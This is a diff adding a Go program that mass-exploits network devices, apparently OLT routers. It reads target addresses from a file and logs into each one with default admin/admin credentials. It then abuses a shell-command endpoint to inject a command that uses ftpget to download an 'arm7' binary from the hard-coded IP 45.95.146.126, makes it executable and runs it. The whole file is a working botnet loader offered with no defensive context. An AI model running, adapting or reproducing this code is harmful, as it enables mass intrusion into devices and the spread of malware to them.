@@ -1,0 +1,179 @@
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"regexp"
+	"strings"
+	"sync"
+)
+
+var (
+	semaphore = make(chan struct{}, 100) // Semaphore to limit concurrent goroutines
+	wg        sync.WaitGroup              // Wait group to wait for all goroutines to finish
+)
+
+func main() {
+	// Read IP:PORT pairs from ips.txt
+	addresses, err := readAddressesFromFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading addresses:", err)
+		return
+	}
+
+	// Iterate through each IP:PORT pair
+	for _, address := range addresses {
+		// Split IP and PORT
+		parts := strings.Split(address, ":")
+		if len(parts) != 2 {
+			fmt.Println("Invalid address format:", address)
+			continue
+		}
+
+		ip := parts[0]
+		port := parts[1]
+
+		// Increment the wait group for each goroutine
+		wg.Add(1)
+
+		// Use a goroutine to make the request for each IP:PORT pair
+		go func(ip, port string) {
+			// Acquire a semaphore token before making the request
+			semaphore <- struct{}{}
+			defer func() {
+				// Release the semaphore token when the goroutine is done
+				<-semaphore
+				// Decrement the wait group when the goroutine is done
+				wg.Done()
+			}()
+
+			// Make the request
+			makeRequest(ip, port)
+		}(ip, port)
+	}
+
+	// Wait for all goroutines to finish
+	wg.Wait()
+}
+
+// Read IP:PORT pairs from a file
+func readAddressesFromFile(filename string) ([]string, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var addresses []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		addresses = append(addresses, scanner.Text())
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	return addresses, nil
+}
+
+// Make a request to the specified IP:PORT pair
+func makeRequest(ip, port string) {
+	url := fmt.Sprintf("http://%s:%s/cgi/login.php", ip, port)
+	payload := []byte("language=en&username=admin&passwd=admin")
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+		return
+	}
+
+	req.Header.Set("Host", fmt.Sprintf("%s:%s", ip, port))
+	req.Header.Set("Content-Length", fmt.Sprint(len(payload)))
+	req.Header.Set("Cache-Control", "max-age=0")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Origin", fmt.Sprintf("http://%s:%s", ip, port))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+	req.Header.Set("Referer", fmt.Sprintf("http://%s:%s/cgi/login.php", ip, port))
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Connection", "close")
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Printf("For IP:%s PORT:%s - Error sending request: %v\n", ip, port, err)
+		return
+	}
+	defer resp.Body.Close()
+
+	fmt.Printf("For IP:%s PORT:%s - Response Status: %s\n", ip, port, resp.Status)
+
+	// Print the response headers for the first request
+	fmt.Println("Response Headers:")
+	for key, values := range resp.Header {
+		for _, value := range values {
+			fmt.Printf("%s: %s\n", key, value)
+			if key == "Set-Cookie" {
+				// Extract Cookie_Login value from each Set-Cookie header
+				cookieLoginRegex := regexp.MustCompile(`Cookie_Login=([^;]+)`)
+				cookieLoginMatches := cookieLoginRegex.FindStringSubmatch(value)
+
+				if len(cookieLoginMatches) > 1 {
+					cookieLogin := cookieLoginMatches[1]
+					// Print the extracted Cookie_Login value
+					fmt.Printf("For IP:%s PORT:%s - Cookie_Login: %s\n", ip, port, cookieLogin)
+
+					// Use Cookie_Login in the next request
+					nextUrl := fmt.Sprintf("http://%s:%s/cgi/home.php?fun=system&page=shellCMDExec&isajax=1&runtab=1&cmdExec=1&command=ping%%20-c%%3Bcd%%20%%2Ftmp%%3Bftpget%%2045.95.146.126%%20arm7%%20arm7%%3Bchmod%%20777%%20arm7%%3B.%%2Farm7%%20olt%%3B&random=1702753446366", ip, port)
+					nextReq, err := http.NewRequest("GET", nextUrl, nil)
+					if err != nil {
+						fmt.Printf("For IP:%s PORT:%s - Error creating next request: %v\n", ip, port, err)
+						return
+					}
+
+					// Set headers and other details for the next request...
+					nextReq.Header.Set("Host", fmt.Sprintf("%s:%s", ip, port))
+					nextReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36")
+					nextReq.Header.Set("Accept", "*/*")
+					nextReq.Header.Set("Referer", fmt.Sprintf("http://%s:%s/cgi/home.php", ip, port))
+					nextReq.Header.Set("Accept-Encoding", "gzip, deflate, br")
+					nextReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+					nextReq.Header.Set("Connection", "close")
+
+					// Set Cookie header with the current Cookie_Login value
+					nextReq.Header.Set("Cookie", fmt.Sprintf("Cookie_Language=en; Cookie_Login=%s; Cookie_Sid=1", cookieLogin))
+
+					nextResp, err := client.Do(nextReq)
+					if err != nil {
+						fmt.Printf("For IP:%s PORT:%s - Error sending next request: %v\n", ip, port, err)
+						return
+					}
+					defer nextResp.Body.Close()
+
+					fmt.Printf("For IP:%s PORT:%s - Next Response Status: %s\n", ip, port, nextResp.Status)
+
+					body, err := ioutil.ReadAll(nextResp.Body)
+					if err != nil {
+						fmt.Printf("For IP:%s PORT:%s - Error reading next response body: %v\n", ip, port, err)
+						return
+					}
+
+					fmt.Printf("For IP:%s PORT:%s - Next Response Body: %s\n", ip, port, string(body))
+				}
+			}
+		}
+	}
+}
